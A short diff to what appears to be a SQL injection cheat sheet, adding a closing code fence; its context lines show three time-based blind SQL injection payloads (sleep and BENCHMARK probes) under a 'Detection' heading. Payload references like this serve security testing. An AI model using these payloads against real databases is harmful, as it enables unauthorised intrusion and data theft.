@@ -7,6 +7,7 @@ Detection
 '+and+sleep(5)--%20
 '+AND+BENCHMARK(100,SHA1(1337))--%20
 '+AND+(SELECT+4057+FROM+(SELECT(SLEEP(5)))rYrD)--%20
+```
 
 Find Number of Columns
 ----------------------
